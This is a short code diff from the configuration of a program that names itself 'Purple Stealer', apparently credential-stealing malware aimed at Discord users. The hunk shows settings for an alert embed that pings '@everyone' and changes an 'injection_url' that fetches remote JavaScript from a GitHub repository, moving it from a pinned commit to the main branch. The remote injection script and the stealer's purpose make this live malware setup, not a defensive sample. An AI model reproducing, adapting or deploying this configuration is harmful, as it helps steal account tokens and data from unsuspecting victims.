@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'Purple Stealer',  
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/OpenSearch0001/unknownahfdhnsfhsdfhnj/a4da9419f1175c5922b9ca38edce173f5fe06f7f/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/OpenSearch0001/unknownahfdhnsfhsdfhnj/main/index.js', 
   /**
    
    **/
